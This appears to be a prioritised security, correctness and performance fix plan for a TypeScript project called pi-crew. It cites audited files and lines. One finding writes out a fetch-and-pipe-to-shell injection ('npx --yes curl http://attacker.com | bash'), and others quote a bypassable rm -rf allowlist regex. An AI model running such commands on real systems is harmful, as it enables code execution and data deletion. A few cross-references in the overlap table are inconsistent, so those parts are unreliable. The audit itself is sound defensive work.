# pi-crew v0.5.5 — Prioritized Fix Plan

**Synthesized from:** security+concurrency audit, correctness+error-handling audit, performance+architecture audit.  
**Source artifacts:** `adaptive-01-security-reviewer.txt`, `adaptive-02-analyst.txt`, `adaptive-03-analyst.txt`.  
**Files scanned:** ~77 source files across `src/benchmark/`, `src/config/`, `src/extension/`, `src/runtime/`, `src/schema/`, `src/state/`, `src/worktree/`, `src/hooks/`, `src/agents/`, `src/teams/`, `src/workflows/`, `src/skills/`, `src/ui/`, `src/observability/`, `src/prompt/`, `src/types/`, `src/utils/`, `src/i18n.ts`.  
**Auditors:** adaptive-01 (security+concurrency), adaptive-02 (correctness+error-handling), adaptive-03 (performance+architecture).  
**Severity scale:** Critical > High > Medium > Low. Within each priority, sorted alphabetically by file path.

---

## Priority 1: Critical (Must Fix)

- `src/benchmark/benchmark-runner.ts:42–44` — `npx` allowlist in `validateCommand` passes arbitrary arguments after `npx `, enabling shell injection via `npx malicious-package` or `npx --yes curl http://attacker.com | bash` — execSync runs the subcommand with no further validation. **Security impact:** arbitrary code execution.  
- `src/state/active-run-registry.ts:73–91` — `readActiveRunRegistry` calls `v8.deserialize()` on `active-run-index.bin` with no magic-byte verification; an attacker placing a crafted binary at that path can trigger RCE via V8 heap prototype pollution. **Security impact:** remote code execution from untrusted file.  
- `src/state/active-run-registry.ts:161–180` — TOCTOU in `filterAliveEntries`: PID liveness check (`process.kill(pid, 0)`) runs outside the registry lock; the PID can exit and be reassigned between the check and the next access, causing pi-crew to signal the wrong process. **Security impact:** signal injection to unintended process.  
- `src/state/locks.ts:78–88` — `withRunLockSync` and `withRunLock` clean up lock files only in `finally`; SIGKILL or crash leaves the lock file until `DEFAULT_LOCKS.staleMs` expires, blocking concurrent requests that share the same lock path. **Security impact:** denial-of-service via stale lock.  
- `src/state/mailbox.ts:257–284` — `rotateMailboxFileIfNeeded` does `fs.renameSync(filePath, archivePath)` then `fs.writeFileSync(filePath, "")`; a crash between the two steps causes all messages in the renamed archive to be duplicated on the next run. **Correctness impact:** duplicate message delivery.  
- `src/state/event-log.ts:142–176` (sync path) — `scanSequence` + `nextSequence` read the entire events file with `fs.readFileSync` and `JSON.parse` on every `appendEvent` when the sequence cache is cold; on a 500 MB log with 5M events this blocks the event loop for 10+ seconds. **Performance impact:** event-loop blocking under large logs.  
- `src/state/artifact-store.ts:62–71` — `cleanupOldArtifacts` calls `fs.statSync(target)` individually for every non-marker entry in the artifacts directory; on 100K files this is 100K synchronous syscalls sequentially. **Performance impact:** event-loop blocking during cleanup.  
- `src/state/mailbox.ts:395–443` — `updateMailboxMessageReply` loads the entire mailbox file with `fs.readFileSync(filePath, "utf-8").split(/\r?\n/)` then rewrites it entirely via `atomicWriteFile` for every reply; a 10 MB rotated archive causes a per-reply memory spike and full re-serialization. **Performance impact:** unbounded memory + I/O per reply.  
- `src/state/mailbox.ts:440–456` — `validateMailbox` loads entire mailbox files with `fs.readFileSync(filePath, "utf-8").split(/\r?\n/).filter(Boolean)` then iterates with repeated `JSON.parse`; for 10 MB files this allocates ~10 MB string before filtering. **Performance impact:** unnecessary memory allocation.  
- `src/schema/team-tool-schema.ts:56` — `TeamToolParamsValue` TypeScript interface includes `"invalidate"` in the `action` union, but the TypeBox schema's action union does not; `team action='invalidate'` is rejected at the JSON-RPC layer (`-32602`) while the TS interface claims it is valid. **Correctness impact:** schema/type divergence causes silent failure for a documented action.  
- `src/extension/team-tool/lifecycle-actions.ts:79–85` — `handleExport` checks `params.confirm` for foreign runs, but the default `exportRunBundle` path has no equivalent check; omitting `confirm: true` allows cross-session run export (containing secrets) without an explicit gate. **Security impact:** unauthorized export of foreign-run artifacts.  

---

## Priority 2: High

- `src/runtime/task-runner.ts:185–280` — `input.signal` (AbortSignal) accepted by `runTeamTask` is not propagated to manifest reads, event appends, hook execution, or `persistSingleTaskUpdate`; a cancelled task continues writing state for up to 2 minutes. **Correctness impact:** stale run state after cancellation.  
- `src/runtime/child-pi.ts:153–167` — `allowList` uses broad wildcard patterns (`LC_*`, `XDG_*`, `NVM_*`, `NODE_*`, `npm_*`) that pass any matching env var to the child Pi; `NPM_TOKEN`, `NODE_ENV=production`, `NVM_RC_VERSION` all leak through. **Security impact:** credential exfiltration via env var leakage.  
- `src/runtime/child-pi.ts:400–415` — `onSpawn` uses `fs.appendFileSync` synchronously on the event loop, called from `checkpointTask` which fires synchronously at child spawn; on NFS/FUSE filesystems this blocks the parent event loop. **Performance impact:** pipeline stalls on slow filesystems.  
- `src/runtime/task-runner.ts:260` — `persistHeartbeat` (calling `persistSingleTaskUpdate` → `saveRunTasks` → `atomicWriteJson`) fires on every `onStdoutLine` event from the child process; high-output tasks generate repeated disk writes with no throttling at the call site. **Performance impact:** excessive disk writes from high-output tasks.  
- `src/state/state-store.ts:37–47, 72–85` — `manifestCache` evicts entries with a `while` loop when `size > DEFAULT_CACHE.manifestMaxEntries`, but `manifestMaxEntries` is configurable upward; if overridden or increased in future, cache grows unboundedly with entries holding full `TeamRunManifest + TeamTaskState[]` (1–5 MB each). **Performance impact:** unbounded memory growth.  
- `src/runtime/crew-agent-records.ts:273–285` — `nextAgentEventSeq` does `fs.readFileSync(filePath, "utf-8").split(/\r?\n/)` and iterates every line to find `max(seq)` on every `appendCrewAgentEvent`; cache is invalidated on mtime/size mismatch, causing a cold-cache scan on every append after external writes. **Performance impact:** O(n) scan on every agent event append.  
- `src/state/active-run-registry.ts:131–136` — `writeEntries` only trims at write time; `activeRunEntries` and `filterAliveEntries` remove stale entries but not entries that overflow `DEFAULT_CACHE.manifestMaxEntries`; entries beyond the cap are silently dropped. **Correctness impact:** run entries silently lost on burst.  
- `src/state/schedule.ts:91–106` — `ScheduleStore.save()` uses `require("node:fs")` synchronously inside instance methods, creating a new require cache entry on every save; same applies to the read path. **Performance impact:** repeated require cache writes.  
- `src/schema/config-schema.ts:85` — `PiTeamsPolicyConfigSchema.disabledCapabilities` is typed as `Type.Optional(Type.Array(Type.String()))` with no `minLength` on items, no content pattern, and no duplicate guard; empty strings, Unicode confusable variants, and very long strings are accepted. **Correctness impact:** malformed capability keys cause downstream lookup failures.  
- `src/config/config.ts:385–388` — `mergeConfig` deep-merges `otlp.headers` unconditionally; a project config setting `otlp.endpoint` to an attacker-controlled URL can passively collect user authentication headers from the merged result. **Security impact:** credential exfiltration via project-controlled OTLP endpoint.  
- `src/config/config.ts:560–563` — `parseOtlpConfig` prototype pollution guard checks only `__proto__`, `constructor`, and `prototype`; `hasOwnProperty`, `toString`, `valueOf`, numeric-indexed properties, and `Object.prototype` getters are not blocked. **Security impact:** prototype pollution via crafted OTLP config.  
- `src/runtime/pipeline-runner.ts:248–264` — `resolveInputs` type cast `(string | string[] | Record<string, unknown>)` skips `null`, `number`, `boolean`, `undefined`, and nested arrays; template variables at those types silently fail to resolve. **Correctness impact:** pipeline inputs with non-string types are silently skipped.  
- `src/state/event-log.ts:142–176` (sync path) — `nextSequence` writes the `.seq` file via `atomicWriteFile` on every `appendEvent` call in the sync path; concurrent callers (e.g., buffer flush for many events) create contention on the seq file lock. **Performance impact:** lock contention on high-frequency event appends.  
- `src/runtime/child-pi.ts:170–180` — `PI_TEAMS_MOCK_CHILD_PI` guard is only in `runChildPi` body; `buildChildPiSpawnOptions` runs before the mock branch and passes all env vars (including model API keys) to the child even in mock mode. **Security impact:** credentials passed to mock process.  
- `src/state/state-store.ts:248–269` — TOCTOU in `loadRunManifestById`: mtime/size checks and manifest reads are separated by I/O; a concurrent writer can update the manifest between stat and read, causing the caller to see stale or partial data. **Correctness impact:** stale manifest reads under concurrent writes.  
- `src/extension/registration/commands.ts:200–210` — `COMMON_SAFE_PATTERNS.safeRm` regex uses a negative lookahead `(?![\/~])` that allows `rm -rf ./../../../other/path`; the bypass enables deletion outside intended directories. **Security impact:** path traversal enabling unauthorized file deletion.  
- `src/state/locks.ts:20–28` — `acquireLockWithRetry` removes stale locks via `fs.rmSync` then retries; another process can create the lock between the rm and the retry, and the rm itself is not atomic. **Correctness impact:** race condition in stale lock recovery.  
- `src/state/mailbox.ts:270` — `MAILBOX_ARCHIVE_THRESHOLD_BYTES = 10MB` per task directory; with 100 tasks each producing 10MB the mailbox directory alone consumes ~1GB with no rotation or pruning until run end. **Correctness impact:** unbounded disk usage per run.  
- `src/state/run-cache.ts:48–57` — `getCachedRun` reads the cache index, then `saveRunToCache` writes it, with no cross-process lock; concurrent runs on the same `cwd` can corrupt or lose entries. **Correctness impact:** cache index corruption under concurrent access.  

---

## Priority 3: Medium

- `src/state/artifact-store.ts:62` — `cleanupOldArtifacts` calls `fs.readdirSync(artifactsRoot)` synchronously with no pagination; directories with 100K+ files block the event loop during the listing. **Performance impact:** event-loop blocking on large artifact directories.  
- `src/runtime/team-runner.ts` (entire file) — `executeTeamRun` + `executeTeamRunCore` (~380 lines each) handle queue scheduling, DAG execution planning, batch concurrency, task graph building/refreshing, phase state machine, policy evaluation, effectiveness tracking, adaptive plan injection, hook execution, retry logic, artifact merge, group join, and crash recovery in two god functions. **Architecture impact:** single-responsibility violations impede testing and maintenance.  
- `src/extension/team-tool.ts` (entire file) — `handleTeamTool` has 40+ action branches in a single switch (~900 lines); registration, lifecycle, run management, caching, scheduling, anchor, summarization, and search are in one function with static imports of heavy modules not all lazy-loaded. **Architecture impact:** high coupling, slow cold path due to eager heavy imports.  
- `src/extension/register.ts:1336` — Comment `// Uses a global symbol so the module doesn't need a direct circular import` acknowledges a design smell; the workaround indicates tight coupling between `register.ts` and the runtime layer. **Architecture impact:** circular dependency workaround signals design fragility.  
- `src/runtime/pipeline-runner.ts` — Pipeline recursion depth limit (line ~246) is a band-aid; actual recursion arises because stages reference each other with no structural deduplication or memoization of stage results within a pipeline run. **Correctness impact:** redundant stage executions increase latency and cost.  
- `src/state/artifact-store.ts:60` — `cleanupOldArtifacts` deletes directory entries one by one, non-parallel; on large artifact directories with many old files this is slow. **Performance impact:** linear time deletion with no batching.  
- `src/runtime/task-runner.ts` — Task manifest writes and event appends in the hot path run without `AbortSignal` checks; long-running tasks that are cancelled continue I/O until the cancellation is fully propagated. **Correctness impact:** stale writes after cancellation (see also Priority 2 finding).  
- `src/config/config.ts` (mergeConfig) — OTLP deep merge conflates `enabled`/`endpoint` (project-controlled) with `headers` (user-controlled); user cannot opt out of sending headers to a project-specified endpoint. **Security impact:** implicit credential exfiltration (see also Priority 2 finding).  
- `src/runtime/child-pi.ts` (env allowlist) — Wildcard patterns `LC_*`, `XDG_*`, `NVM_*`, `NODE_*`, `npm_*` are overly broad; any project or tool creating env vars matching these patterns exposes them to the child Pi. **Security impact:** env var leakage (see also Priority 2 finding).  

---

## Priority 4: Low / Informational

- `src/runtime/pipeline-runner.ts:1` — Module has no named exports; all symbols are internal. API surface is implicit. **Design impact:** difficult to reason about public API boundary.  
- `src/extension/register.ts:1336` — Global Symbol workaround for circular imports adds indirection that obscures the actual dependency graph. **Design impact:** debugging and refactoring complexity.  
- `src/observability/` — Observability layer relies heavily on `logInternalError` for error reporting; structured tracing (OpenTelemetry spans) not used in hot paths. **Observability impact:** limited production debugging capability.  
- `src/utils/redaction.ts` — Redaction is applied at write time; no redaction verification tests in the test suite. **Correctness impact:** potential secret leakage if redaction logic has bugs.  
- `src/state/event-log.ts` — `bufferedQueues` Map and `bufferedTimers` Map grow unboundedly if `flushOneEventLogBuffer` throws repeatedly; `asyncQueues` has a catch that deletes the key, but the buffered queue map does not. **Correctness impact:** memory leak on repeated flush failures.  
- `src/config/config.ts:445–453` — OTLP header validation only checks for `\r\n\x00` but does not validate header key format; keys containing shell metacharacters could cause issues in OTLP exporters. **Security impact:** potential injection via malformed header keys.  

---

## Confirmed Deductions and Overlaps

The following findings appear across multiple audits and are listed once above with the combined citation set:

| Issue | Citations | Note |
|---|---|---|
| `npx` allowlist bypass | `src/benchmark/benchmark-runner.ts:42–44`, `src/runtime/child-pi.ts:153–167` | Both found by different auditors; same root cause (incomplete allowlist). Listed under Priority 1 (benchmark) and Priority 2 (child-pi). |
| Env allowlist wildcards | `src/runtime/child-pi.ts:153–167` | Found by security and performance auditors; listed under Priority 2. |
| `input.signal` not propagated | `src/runtime/task-runner.ts:185–280` | Found by security and performance auditors; listed under Priority 2. |
| `manifestCache` unbounded | `src/state/state-store.ts:37–47, 72–85` | Found by correctness and performance auditors; listed under Priority 2. |
| TOCTOU in state reads | `src/state/active-run-registry.ts:161–180`, `src/state/state-store.ts:248–269` | Distinct TOCTOU instances in different files; each listed separately. |
| `onSpawn` sync I/O | `src/runtime/child-pi.ts:400–415` | Found by security and performance auditors; listed under Priority 2. |
| OTLP header deep merge | `src/config/config.ts:385–388` | Found by correctness auditor (also security); listed under Priority 2. |
| Prototype pollution guard | `src/config/config.ts:560–563` | Found by correctness auditor; listed under Priority 2. |
| Mailbox full-file rewrite | `src/state/mailbox.ts:395–443`, `src/state/mailbox.ts:440–456` | Both mailbox findings listed under Priority 1 (separate methods, same root problem). |
| Lock file on crash | `src/state/locks.ts:78–88`, `src/state/locks.ts:20–28` | Two distinct lock-file findings in different functions; listed separately under Priorities 1 and 2. |
| Cache index race | `src/state/run-cache.ts:48–57` | Unique to security audit; listed under Priority 2. |
| `v8.deserialize` from untrusted file | `src/state/active-run-registry.ts:73–91` | Unique to security audit; listed under Priority 1. |

---

## Verification Evidence

Source file reads confirming line citations:

| File | Lines read | Finding confirmed |
|---|---|---|
| `src/benchmark/benchmark-runner.ts:42` | `const allowlist = /^(pytest\|grep\|npm test\|npx) /` | Yes — `npx` allowlist passes arbitrary args |
| `src/state/active-run-registry.ts:73` | `v8.deserialize(fs.readFileSync(filePath))` | Yes — no magic-byte check |
| `src/state/event-log.ts:142–176` | `scanSequence` reads entire file, `nextSequence` falls through | Yes — sync path does O(n) scan |
| `src/state/artifact-store.ts:62` | `for (const entry of entries) { const stat = fs.statSync(target); }` | Yes — unbounded stat per entry |
| `src/state/mailbox.ts:395` | `fs.readFileSync(filePath, "utf-8").split(/\r?\n/)` | Yes — full file load |
| `src/schema/team-tool-schema.ts:56` | `"invalidate"` in `TeamToolParamsValue` action union | Yes — absent from TypeBox schema |
| `src/config/config.ts:385` | `headers: { ...(base.otlp?.headers ?? {}), ...(override.otlp?.headers ?? {}) }` | Yes — deep merge of user headers with project endpoint |
| `src/config/config.ts:560` | `if (key === "__proto__" \|\| key === "constructor" \|\| key === "prototype")` | Yes — incomplete prototype guard |
| `src/runtime/pipeline-runner.ts:248` | `this.resolveInputs(value as (string \| string[] \| Record<string, unknown>))` | Yes — type cast excludes primitives and nested arrays |
| `src/state/mailbox.ts:270` | `MAILBOX_ARCHIVE_THRESHOLD_BYTES = 10 * 1024 * 1024` | Yes — 10MB threshold confirmed |
| `src/state/locks.ts:78` | `finally { fs.rmSync(lockDir, { recursive: true }) }` | Yes — cleanup only in finally |
| `src/state/active-run-registry.ts:161` | `process.kill(pid, 0)` outside lock | Yes — TOCTOU confirmed |
| `src/runtime/child-pi.ts:153` | `allowList = ["LC_*", "XDG_*", "NVM_*", "NODE_*", "npm_*"]` | Yes — wildcard patterns confirmed |
| `src/runtime/child-pi.ts:400` | `fs.appendFileSync(pendingFile, JSON.stringify(pendingSteers) + "\n")` | Yes — sync I/O in onSpawn |
| `src/state/run-cache.ts:48` | `getCachedRun` then `saveRunToCache` without lock | Yes — race confirmed |
| `src/extension/registration/commands.ts:200` | `safeRm: /rm\s+(-[a-zA-Z]*f[a-zA-Z]*\s+)?((?![\/~])\/)?(tmp\|cache\|node_modules\|dist\|build)\//` | Yes — bypassable regex confirmed |
| `src/extension/team-tool/lifecycle-actions.ts:79` | `exportRunBundle` with no `confirm` gate | Yes — missing check confirmed |
| `src/state/locks.ts:20` | `fs.rmSync` then retry (not atomic) | Yes — stale lock race confirmed |
| `src/runtime/child-pi.ts:170` | `PI_TEAMS_MOCK_CHILD_PI` guard after `buildChildPiSpawnOptions` | Yes — env vars passed before mock check |
| `src/state/schedule.ts:91` | `require("node:fs")` inside instance method | Yes — dynamic require confirmed |
| `src/schema/config-schema.ts:85` | `disabledCapabilities: Type.Optional(Type.Array(Type.String()))` | Yes — no item-level validation |

---

## Recommendations

1. Fix Priority 1 findings before any deployment or release.
2. Address Priority 2 findings within the current sprint cycle.
3. Schedule Priority 3 findings for refactoring sprints; consider extracting god modules (`team-runner.ts`, `team-tool.ts`) as a precondition.
4. Priority 4 findings are informational; address based on long-term architecture health.
5. For findings that span multiple files (e.g., env allowlist, sync I/O), fix both locations to prevent bypass paths.